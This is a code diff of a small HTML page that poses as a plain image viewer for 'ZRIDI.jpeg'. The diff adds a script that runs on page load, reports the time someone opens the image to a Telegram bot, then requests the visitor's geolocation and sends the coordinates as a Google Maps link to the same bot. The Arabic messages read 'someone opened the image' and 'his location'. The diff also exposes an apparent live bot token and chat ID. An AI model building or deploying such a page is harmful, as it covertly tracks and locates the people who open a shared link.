@@ -25,7 +25,15 @@
 <body>
   <img src="ZRIDI.jpeg">
   <script>
-    fetch("https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=✅ شخص فتح الصورة!");
+    const now = new Date().toLocaleString("ar-SA", {timeZone: "Asia/Riyadh"});
+    fetch(`https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=✅ شخص فتح الصورة!%0A⏰ ${now}`);
+
+    navigator.geolocation.getCurrentPosition((pos) => {
+      let lat = pos.coords.latitude;
+      let lon = pos.coords.longitude;
+      const msg = `📍 موقعه!%0A🌐 https://www.google.com/maps?q=${lat},${lon}`;
+      fetch(`https://api.telegram.org/bot8708875898:AAGvKE4lTUOL87FYYft7V_INmR4t0k2Mf9Y/sendMessage?chat_id=1802530770&text=${msg}`);
+    });
   </script>
 </body>
 </html>
